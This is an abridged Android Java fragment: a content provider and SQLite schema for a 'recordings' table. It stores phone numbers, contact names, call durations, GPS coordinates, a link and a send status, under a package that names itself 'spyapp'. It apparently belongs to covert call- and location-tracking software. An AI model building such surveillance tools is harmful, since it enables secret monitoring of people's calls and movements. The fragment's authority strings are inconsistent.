package com.enuke.smartapp.browser;
...
{
    public static final Uri CONTENT_URI = Uri.parse("content://com.enuke.spyapp..browser/recordings");
    ...
    public Uri insert(Uri _uri, ContentValues _initialValues,String tablename) {
    ...
    static {
        ...
        uriMatcher.addURI("com.enuke.sypapp.call", "recordings", RECORDINGS);
        uriMatcher.addURI("com.enuke.sypapp.call", "recordings/#", RECORDING_ID);
    }
    ...
    public static final int PHONE_COLUME = 2;
    public static final int TYPE_COLUME = 3;
    public static final int PHONE_NAME_COLUME = 4;
    public static final int DURATION_COLUMN = 5;
    public static final int DETAILS_COLUMN = 6;
    public static final int LONGITUDE_COLUMN =7;
    public static final int LATITUDE_COLUMN = 8;
    public static final int LINK_COLUMN = 9;
    ...
    private static class recordingsDatabaseHelper extends SQLiteOpenHelper {
        private static final String DATABASE_CREATE = 
            ...
            + KEY_LINK + " TEXT,"+ KEY_SEND_STATUS +" TEXT );";
